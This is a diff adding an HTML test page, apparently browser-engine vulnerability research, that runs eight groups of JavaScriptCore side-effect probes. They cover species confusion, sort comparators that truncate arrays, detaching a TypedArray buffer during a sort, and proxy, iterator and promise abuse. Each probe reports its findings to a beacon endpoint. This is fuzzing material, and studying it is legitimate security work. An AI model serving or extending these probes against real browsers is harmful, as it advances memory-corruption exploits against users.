@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1229</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#00ff41;font:11px/1.4 monospace;padding:8px}
+h3{color:#00ccff;margin:6px 0 3px}
+pre{white-space:pre-wrap;word-break:break-all;margin:2px 0;font-size:10px}
+.pass{color:#00ff41} .fail{color:#ff4444} .warn{color:#ffaa00}
+</style>
+</head>
+<body>
+<h3>P1229: Species Confusion + Callback Side-Effects</h3>
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1229-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+B('START','P1229-species-callback-confusion');
+log('=== P1229: Species Confusion + Callback Side-Effects ===');
+log('Testing 8 JSC side-effect attack vectors...');
+log('');
+
+var results={};
+var R=results;
+
+// ============================================================
+// EXP A: Array.prototype.concat species confusion
+// If arr[Symbol.isConcatSpreadable] getter modifies the array
+// during concat, JSC might use stale length/buffer
+// ============================================================
+try{
+  log('[A] Array.concat species confusion...');
+  var concatAnomalies=0;
+
+  // A1: isConcatSpreadable getter that shrinks the source
+  for(var trial=0;trial<50;trial++){
+    var arr=new Array(100);
+    for(var i=0;i<100;i++)arr[i]=i;
+    var evil={length:10};
+    for(var i=0;i<10;i++)evil[i]=0x41+i;
+    var triggerCount=0;
+    Object.defineProperty(evil,Symbol.isConcatSpreadable,{
+      get:function(){
+        triggerCount++;
+        // Shrink the source array during spread check
+        arr.length=0;
+        return true;
+      }
+    });
+    var result;
+    try{
+      result=[].concat(arr,evil);
+    }catch(e){result='err:'+e.message;}
+    if(typeof result==='object' && result.length){
+      // Check if we got undefined holes (stale length used)
+      var undefs=0;
+      for(var i=0;i<result.length;i++){
+        if(result[i]===undefined)undefs++;
+      }
+      if(undefs>10)concatAnomalies++;
+    }
+  }
+
+  // A2: Species constructor that returns wrong-sized array
+  var speciesCalled=0;
+  function EvilArray(){
+    speciesCalled++;
+    // Return a SMALLER array than expected
+    return new Array(1);
+  }
+  EvilArray[Symbol.species]=EvilArray;
+  try{
+    var src=[1,2,3,4,5];
+    src.constructor=EvilArray;
+    var sliced=src.slice(0,5);
+    R.a2_species=speciesCalled+'|len='+sliced.length+'|type='+(sliced instanceof EvilArray);
+  }catch(e){R.a2_species='err:'+e.message;}
+
+  // A3: concat with Proxy that changes length mid-iteration
+  var proxyReads=[];
+  var proxyArr=[10,20,30,40,50];
+  var p=new Proxy(proxyArr,{
+    get:function(t,prop){
+      if(prop==='length'){
+        proxyReads.push('len');
+        if(proxyReads.length>2){
+          // Shrink backing array after first length read
+          t.length=1;
+        }
+        return 5; // LIE about length
+      }
+      if(typeof prop==='string'&&/^\d+$/.test(prop)){
+        proxyReads.push(prop);
+        return t[prop]; // might be undefined if we shrank
+      }
+      if(prop===Symbol.isConcatSpreadable)return true;
+      return t[prop];
+    }
+  });
+  try{
+    var concatResult=[].concat(p);
+    var concatUndefs=0;
+    for(var i=0;i<concatResult.length;i++){
+      if(concatResult[i]===undefined)concatUndefs++;
+    }
+    R.a3_proxy='len='+concatResult.length+'|undefs='+concatUndefs+'|reads='+proxyReads.length;
+  }catch(e){R.a3_proxy='err:'+e.message;}
+
+  R.a_concat='anomalies='+concatAnomalies;
+  B('EXP-A',JSON.stringify(R.a_concat)+'|'+JSON.stringify(R.a2_species)+'|'+JSON.stringify(R.a3_proxy));
+  log('  concat anomalies='+concatAnomalies+' species='+R.a2_species+' proxy='+R.a3_proxy);
+}catch(e){B('EXP-A-ERR',e.message);log('  [A] ERROR: '+e.message);}
+
+// ============================================================
+// EXP B: Array.prototype.sort comparator that modifies array
+// Historically caused UAF in JSC when comparator truncates
+// the array during sort
+// ============================================================
+try{
+  log('[B] Array.sort comparator side-effects...');
+  var sortAnomalies=0;
+
+  // B1: comparator that truncates array
+  for(var trial=0;trial<20;trial++){
+    var arr=[];
+    for(var i=0;i<200;i++)arr.push(Math.random());
+    var callCount=0;
+    try{
+      arr.sort(function(a,b){
+        callCount++;
+        if(callCount===50){
+          arr.length=10; // truncate during sort!
+        }
+        return a-b;
+      });
+      // Check for corruption: values outside [0,1) range
+      for(var i=0;i<arr.length;i++){
+        if(typeof arr[i]!=='number'||(arr[i]<0&&arr[i]!==undefined)||arr[i]>=1){
+          if(arr[i]!==undefined)sortAnomalies++;
+        }
+      }
+    }catch(e){
+      // Exception during sort is fine (engine protecting itself)
+    }
+  }
+
+  // B2: comparator that extends array with objects
+  var extendAnomalies=0;
+  for(var trial=0;trial<20;trial++){
+    var arr=[];
+    for(var i=0;i<100;i++)arr.push(i);
+    var count=0;
+    try{
+      arr.sort(function(a,b){
+        count++;
+        if(count<5){
+          // Push typed arrays that might confuse internal buffer
+          for(var j=0;j<50;j++)arr.push(new Uint8Array(64));
+        }
+        if(typeof a==='object'||typeof b==='object')extendAnomalies++;
+        return(typeof a==='number'?a:0)-(typeof b==='number'?b:0);
+      });
+    }catch(e){}
+  }
+
+  // B3: comparator that replaces elements with getters
+  var getterTriggered=0;
+  try{
+    var arr=[5,3,1,4,2,8,7,6,9,0];
+    var defineCount=0;
+    arr.sort(function(a,b){
+      defineCount++;
+      if(defineCount===3){
+        // Define getter on array index
+        Object.defineProperty(arr,0,{
+          get:function(){getterTriggered++;return 999;},
+          configurable:true
+        });
+      }
+      return a-b;
+    });
+    R.b3_getter='triggered='+getterTriggered+'|defines='+defineCount;
+  }catch(e){R.b3_getter='err:'+e.message;}
+
+  R.b_sort='trunc_anomalies='+sortAnomalies+'|extend='+extendAnomalies;
+  B('EXP-B',JSON.stringify(R.b_sort)+'|'+JSON.stringify(R.b3_getter));
+  log('  sort trunc='+sortAnomalies+' extend='+extendAnomalies+' getter='+R.b3_getter);
+}catch(e){B('EXP-B-ERR',e.message);log('  [B] ERROR: '+e.message);}
+
+// ============================================================
+// EXP C: RegExp[Symbol.split] / [Symbol.replace] side effects
+// Custom RegExp with overridden exec() that modifies input
+// ============================================================
+try{
+  log('[C] RegExp symbol side-effects...');
+
+  // C1: Custom RegExp whose exec modifies lastIndex wildly
+  var execCalls=0;
+  var origExec=RegExp.prototype.exec;
+  var evilRe=/a/g;
+  var splitAnomalies=0;
+  try{
+    evilRe[Symbol.split]=function(str){
+      var results=[];
+      var i=0;
+      while(i<str.length&&results.length<100){
+        results.push(str.charAt(i));
+        i++;
+      }
+      return results;
+    };
+    var splitResult='aabababa'[Symbol.split](evilRe);
+    // Not useful - we overrode it. Try the real path:
+  }catch(e){}
+
+  // C2: RegExp subclass with exec() that returns oversized array
+  function EvilRegExp(p,f){
+    var r=new RegExp(p,f);
+    r.__proto__=EvilRegExp.prototype;
+    return r;
+  }
+  EvilRegExp.prototype=Object.create(RegExp.prototype);
+  EvilRegExp.prototype.exec=function(str){
+    execCalls++;
+    var result=origExec.call(this,str);
+    if(result){
+      // Inject extra indexed properties
+      result[100]='INJECTED';
+      result[200]='INJECTED2';
+    }
+    return result;
+  };
+
+  try{
+    var evil2=new EvilRegExp('(a)','g');
+    var replaceResult='aaaa'.replace(evil2,function(m){return 'X';});
+    R.c2_replace='result='+replaceResult+'|execs='+execCalls;
+  }catch(e){R.c2_replace='err:'+e.message;}
+
+  // C3: String.prototype.replace with replacer that modifies the string object
+  var replaceAnom=0;
+  try{
+    var str=new String('hello world hello');
+    var rcount=0;
+    var replaced=String.prototype.replace.call(str,/hello/g,function(match,offset){
+      rcount++;
+      // Try to modify the string's internal characters
+      try{str[offset]='X';}catch(e){}
+      return 'BYE';
+    });
+    R.c3_replace='result='+replaced+'|calls='+rcount;
+  }catch(e){R.c3_replace='err:'+e.message;}
+
+  // C4: matchAll with side-effect in next()
+  try{
+    var re=/a/g;
+    var iter='aaa'.matchAll(re);
+    var matchCount=0;
+    var first=iter.next();
+    re.lastIndex=100; // modify during iteration
+    var second=iter.next();
+    re.lastIndex=0;
+    var third=iter.next();
+    R.c4_matchAll='first='+!first.done+'|second='+!second.done+'|third='+!third.done;
+  }catch(e){R.c4_matchAll='err:'+e.message;}
+
+  B('EXP-C',JSON.stringify(R.c2_replace)+'|'+JSON.stringify(R.c3_replace)+'|'+JSON.stringify(R.c4_matchAll));
+  log('  replace='+R.c2_replace+' strReplace='+R.c3_replace+' matchAll='+R.c4_matchAll);
+}catch(e){B('EXP-C-ERR',e.message);log('  [C] ERROR: '+e.message);}
+
+// ============================================================
+// EXP D: Array.prototype.splice/map/filter with side-effect callbacks
+// that modify the array during iteration
+// ============================================================
+try{
+  log('[D] Array iteration side-effects...');
+
+  // D1: splice with valueOf on argument that modifies array
+  var spliceAnom=0;
+  for(var trial=0;trial<20;trial++){
+    var arr=[1,2,3,4,5,6,7,8,9,10];
+    var evil={valueOf:function(){
+      arr.push(11,12,13,14,15);
+      arr.length=2;
+      return 3; // deleteCount
+    }};
+    try{
+      var removed=arr.splice(1,evil);
+      // Check for stale references
+      if(removed.length>3)spliceAnom++;
+      for(var i=0;i<removed.length;i++){
+        if(removed[i]===undefined&&i<3)spliceAnom++;
+      }
+    }catch(e){}
+  }
+
+  // D2: map callback that modifies source array
+  var mapAnom=0;
+  for(var trial=0;trial<20;trial++){
+    var arr=new Array(50);
+    for(var i=0;i<50;i++)arr[i]=i;
+    var readUndefs=0;
+    try{
+      var mapped=arr.map(function(val,idx){
+        if(idx===5){
+          arr.length=10;
+        }
+        if(val===undefined)readUndefs++;
+        return val;
+      });
+      // mapped should still be length 50 (spec: uses initial length)
+      // but elements 10-49 might be undefined
+      if(mapped.length!==50)mapAnom++;
+    }catch(e){}
+  }
+
+  // D3: filter with callback that makes array sparse
+  var filterAnom=0;
+  for(var trial=0;trial<20;trial++){
+    var arr=[];
+    for(var i=0;i<100;i++)arr.push(i);
+    var fcalls=0;
+    try{
+      var filtered=arr.filter(function(val,idx){
+        fcalls++;
+        if(idx===10){
+          // Delete elements ahead
+          for(var j=50;j<100;j++)delete arr[j];
+        }
+        return val%2===0;
+      });
+      // Filter should skip deleted elements (no callback for them)
+      if(fcalls>60)filterAnom++;
+    }catch(e){}
+  }
+
+  // D4: reduce with callback that modifies accumulator type
+  try{
+    var arr=[1,2,3,4,5];
+    var reduceResult=arr.reduce(function(acc,val,idx){
+      if(idx===2){
+        // Replace accumulator with ArrayBuffer
+        return new ArrayBuffer(64);
+      }
+      if(acc instanceof ArrayBuffer){
+        // Try to read from the ArrayBuffer as if it were a number
+        return new DataView(acc).getFloat64(0)+val;
+      }
+      return acc+val;
+    },0);
+    R.d4_reduce='type='+typeof reduceResult+'|val='+reduceResult;
+  }catch(e){R.d4_reduce='err:'+e.message;}
+
+  R.d_iter='splice='+spliceAnom+'|map='+mapAnom+'|filter='+filterAnom;
+  B('EXP-D',JSON.stringify(R.d_iter)+'|'+JSON.stringify(R.d4_reduce));
+  log('  splice='+spliceAnom+' map='+mapAnom+' filter='+filterAnom+' reduce='+R.d4_reduce);
+}catch(e){B('EXP-D-ERR',e.message);log('  [D] ERROR: '+e.message);}
+
+// ============================================================
+// EXP E: TypedArray.prototype.sort with comparator side-effects
+// TypedArray has a fixed-size backing store — what if comparator
+// detaches the buffer?
+// ============================================================
+try{
+  log('[E] TypedArray.sort buffer detach race...');
+  var taAnom=0;
+
+  // E1: sort comparator that transfers (detaches) the buffer
+  for(var trial=0;trial<10;trial++){
+    var buf=new ArrayBuffer(400); // 50 float64s
+    var f64=new Float64Array(buf);
+    for(var i=0;i<50;i++)f64[i]=Math.random();
+    var transferred=false;
+    var sortCalls=0;
+    try{
+      f64.sort(function(a,b){
+        sortCalls++;
+        if(sortCalls===10&&!transferred){
+          // Transfer buffer to detach it
+          try{
+            structuredClone(buf,{transfer:[buf]});
+            transferred=true;
+          }catch(e){}
+        }
+        return a-b;
+      });
+      // If we're still here after detach during sort, check for corruption
+      if(transferred){
+        // Buffer was detached — any access should be safe
+        try{
+          var val=f64[0];
+          if(val!==undefined&&!isNaN(val)){
+            taAnom++; // Reading from detached buffer returned real value!
+            R.e_danger='DETACHED_READ_RETURNED:'+val;
+          }
+        }catch(e){}
+      }
+    }catch(e){
+      // Exception is the SAFE behavior
+      if(transferred)R.e1_exc='safe:'+e.message;
+    }
+  }
+
+  // E2: TypedArray.set with source that detaches target during iteration
+  try{
+    var target=new Uint32Array(100);
+    for(var i=0;i<100;i++)target[i]=i;
+    var evilSource={
+      length:100,
+      0:42
+    };
+    // Proxy source whose element access detaches target
+    var srcProxy=new Proxy(evilSource,{
+      get:function(t,prop){
+        if(prop==='length')return 100;
+        if(prop==='50'){
+          // Try to detach target's buffer
+          try{structuredClone(target.buffer,{transfer:[target.buffer]});}catch(e){}
+        }
+        return t[prop]||0;
+      }
+    });
+    try{
+      target.set(srcProxy);
+      R.e2_set='completed|t0='+target[0]+'|tlen='+target.length;
+    }catch(e){R.e2_set='err:'+e.message;}
+  }catch(e){R.e2_set='outer:'+e.message;}
+
+  R.e_ta='anomalies='+taAnom+'|transferred='+transferred;
+  B('EXP-E',JSON.stringify(R.e_ta)+'|'+JSON.stringify(R.e1_exc)+'|'+JSON.stringify(R.e2_set));
+  log('  TA sort anomalies='+taAnom+' exc='+(R.e1_exc||'none')+' set='+R.e2_set);
+}catch(e){B('EXP-E-ERR',e.message);log('  [E] ERROR: '+e.message);}
+
+// ============================================================
+// EXP F: Proxy + Array.from / Array.of with iterator protocol abuse
+// Custom iterator that yields more/fewer items than length claims
+// ============================================================
+try{
+  log('[F] Iterator protocol abuse...');
+
+  // F1: Array.from with iterable whose length lies
+  var f1Anom=0;
+  var iterObj={
+    length:5,
+    [Symbol.iterator]:function(){
+      var i=0;
+      return{
+        next:function(){
+          if(i<100){ // Yield 100 items when length says 5
+            return{value:i++,done:false};
+          }
+          return{done:true};
+        }
+      };
+    }
+  };
+  try{
+    var fromResult=Array.from(iterObj);
+    // Array.from should use iterator, not length
+    R.f1_from='len='+fromResult.length;
+    if(fromResult.length===100)R.f1_note='used_iterator';
+    if(fromResult.length===5)R.f1_note='used_length';
+  }catch(e){R.f1_from='err:'+e.message;}
+
+  // F2: for..of with iterator that modifies collection
+  try{
+    var arr=[1,2,3,4,5,6,7,8,9,10];
+    var collected=[];
+    for(var val of arr){
+      collected.push(val);
+      if(collected.length===3){
+        arr.push(11,12,13,14,15);
+        arr.splice(0,5);
+      }
+    }
+    R.f2_forof='collected='+collected.length+'|arr='+arr.length;
+  }catch(e){R.f2_forof='err:'+e.message;}
+
+  // F3: Spread with Proxy iterator that yields wrong types
+  try{
+    var spreadSrc={
+      [Symbol.iterator]:function(){
+        var i=0;
+        var items=[1,new ArrayBuffer(32),'hello',null,undefined,{},true,3.14];
+        return{
+          next:function(){
+            if(i<items.length)return{value:items[i++],done:false};
+            return{done:true};
+          }
+        };
+      }
+    };
+    var spread=[...spreadSrc];
+    R.f3_spread='len='+spread.length+'|types=';
+    var types=[];
+    for(var i=0;i<spread.length;i++)types.push(typeof spread[i]);
+    R.f3_spread+= types.join(',');
+  }catch(e){R.f3_spread='err:'+e.message;}
+
+  B('EXP-F',JSON.stringify(R.f1_from)+'|'+JSON.stringify(R.f2_forof)+'|'+JSON.stringify(R.f3_spread));
+  log('  from='+R.f1_from+' '+(R.f1_note||'')+' forof='+R.f2_forof);
+  log('  spread='+R.f3_spread);
+}catch(e){B('EXP-F-ERR',e.message);log('  [F] ERROR: '+e.message);}
+
+// ============================================================
+// EXP G: Promise.all / Promise.race with thenable side effects
+// Thenable that resolves with itself, or modifies the array
+// during resolution
+// ============================================================
+try{
+  log('[G] Promise thenable abuse...');
+
+  // G1: Thenable that recurses
+  var recursionDepth=0;
+  var maxRecursion=0;
+  var thenable1={
+    then:function(resolve){
+      recursionDepth++;
+      if(recursionDepth>maxRecursion)maxRecursion=recursionDepth;
+      if(recursionDepth<100){
+        resolve(thenable1); // resolve with ITSELF
+      }else{
+        resolve('done');
+      }
+      recursionDepth--;
+    }
+  };
+  Promise.resolve(thenable1).then(function(v){
+    R.g1_recurse='maxDepth='+maxRecursion+'|val='+v;
+    B('EXP-G1',R.g1_recurse);
+  }).catch(function(e){
+    R.g1_recurse='err:'+e.message;
+    B('EXP-G1',R.g1_recurse);
+  });
+
+  // G2: Promise.all with array modified during resolution
+  var promises=[];
+  for(var i=0;i<10;i++){
+    promises.push(new Promise(function(resolve){
+      setTimeout(function(){resolve(42);},1);
+    }));
+  }
+  // Proxy the array to modify during iteration
+  var proxyPromises=new Proxy(promises,{
+    get:function(t,prop){
+      if(prop==='length')return t.length;
+      if(prop==='3'){
+        // When element 3 is accessed, add more promises
+        for(var i=0;i<5;i++){
+          t.push(Promise.resolve(99));
+        }
+      }
+      return t[prop];
+    }
+  });
+  try{
+    Promise.all(proxyPromises).then(function(results){
+      R.g2_all='len='+results.length+'|last='+results[results.length-1];
+      B('EXP-G2',R.g2_all);
+    }).catch(function(e){
+      R.g2_all='err:'+e.message;
+      B('EXP-G2',R.g2_all);
+    });
+  }catch(e){R.g2_all='sync_err:'+e.message;B('EXP-G2',R.g2_all);}
+
+  // G3: Thenable whose then() throws after resolve
+  var g3Resolved=false;
+  var thenable3={
+    then:function(resolve,reject){
+      resolve('OK');
+      g3Resolved=true;
+      throw new Error('post-resolve throw');
+    }
+  };
+  Promise.resolve(thenable3).then(function(v){
+    R.g3_throw='resolved='+v;
+    B('EXP-G3-resolve',R.g3_throw);
+  }).catch(function(e){
+    R.g3_throw='caught='+e.message;
+    B('EXP-G3-catch',R.g3_throw);
+  });
+
+  log('  [G] promises dispatched (async results via beacon)');
+}catch(e){B('EXP-G-ERR',e.message);log('  [G] ERROR: '+e.message);}
+
+// ============================================================
+// EXP H: FinalizationRegistry + WeakRef timing attacks
+// Create objects, register them, null refs, GC, check if
+// finalization callback fires during a critical section
+// ============================================================
+try{
+  log('[H] FinalizationRegistry timing...');
+
+  if(typeof FinalizationRegistry==='undefined'){
+    R.h_finreg='UNAVAILABLE';
+    B('EXP-H','unavailable');
+  }else{
+    var cleanupCalls=0;
+    var cleanupDuringSort=false;
+    var fr=new FinalizationRegistry(function(held){
+      cleanupCalls++;
+      if(held==='sort')cleanupDuringSort=true;
+    });
+
+    // Register many objects then null them
+    var weakrefs=[];
+    for(var i=0;i<200;i++){
+      var obj={id:i,data:new ArrayBuffer(256)};
+      fr.register(obj,'obj'+i);
+      weakrefs.push(new WeakRef(obj));
+      obj=null;
+    }
+
+    // Try to trigger GC with allocation pressure
+    var pressure=[];
+    for(var i=0;i<5000;i++){
+      pressure.push(new ArrayBuffer(4096));
+    }
+    pressure=null;
+
+    // Check WeakRefs after GC pressure
+    setTimeout(function(){
+      var alive=0,dead=0;
+      for(var i=0;i<weakrefs.length;i++){
+        if(weakrefs[i].deref())alive++;
+        else dead++;
+      }
+      R.h_gc1='alive='+alive+'|dead='+dead+'|cleanups='+cleanupCalls;
+      B('EXP-H-GC1',R.h_gc1);
+      log('  [H] gc1: '+R.h_gc1);
+
+      // Register object during sort then try to force cleanup
+      var sortObj={id:'sort_target',buffer:new ArrayBuffer(192)};
+      fr.register(sortObj,'sort');
+      var sortWeak=new WeakRef(sortObj);
+      sortObj=null; // eligible for GC
+
+      // Now sort a large array — does finalization interrupt it?
+      var bigArr=[];
+      for(var i=0;i<10000;i++)bigArr.push(Math.random());
+      bigArr.sort(function(a,b){
+        // Allocation pressure during sort
+        for(var j=0;j<10;j++)new ArrayBuffer(1024);
+        return a-b;
+      });
+
+      setTimeout(function(){
+        R.h_sort='during='+cleanupDuringSort+'|sortAlive='+(sortWeak.deref()?'yes':'no')+'|cleanups='+cleanupCalls;
+        B('EXP-H-SORT',R.h_sort);
+        log('  [H] sort: '+R.h_sort);
+
+        // Final summary
+        B('EXP-H-DONE',JSON.stringify(R.h_gc1)+'|'+JSON.stringify(R.h_sort));
+      },500);
+    },200);
+  }
+}catch(e){B('EXP-H-ERR',e.message);log('  [H] ERROR: '+e.message);}
+
+// ============================================================
+// FINAL: Collect sync results and send summary after async
+// ============================================================
+setTimeout(function(){
+  var summary='';
+  summary+='A_concat='+JSON.stringify(R.a_concat);
+  summary+='|A2_species='+JSON.stringify(R.a2_species);
+  summary+='|A3_proxy='+JSON.stringify(R.a3_proxy);
+  summary+='|B_sort='+JSON.stringify(R.b_sort);
+  summary+='|B3_getter='+JSON.stringify(R.b3_getter);
+  summary+='|C2='+JSON.stringify(R.c2_replace);
+  summary+='|C3='+JSON.stringify(R.c3_replace);
+  summary+='|C4='+JSON.stringify(R.c4_matchAll);
+  summary+='|D_iter='+JSON.stringify(R.d_iter);
+  summary+='|D4='+JSON.stringify(R.d4_reduce);
+  summary+='|E_ta='+JSON.stringify(R.e_ta);
+  summary+='|E2='+JSON.stringify(R.e2_set);
+  summary+='|F1='+JSON.stringify(R.f1_from);
+  summary+='|F2='+JSON.stringify(R.f2_forof);
+  summary+='|F3='+JSON.stringify(R.f3_spread);
+  summary+='|G1='+JSON.stringify(R.g1_recurse);
+  summary+='|G2='+JSON.stringify(R.g2_all);
+  summary+='|G3='+JSON.stringify(R.g3_throw);
+  summary+='|H='+JSON.stringify(R.h_gc1)+'|H_sort='+JSON.stringify(R.h_sort);
+
+  B('SUMMARY',summary);
+  log('');
+  log('=== SUMMARY SENT ===');
+
+  B('DONE','all');
+  log('P1229 COMPLETE');
+},3000);
+</script>
+</body>
+</html>
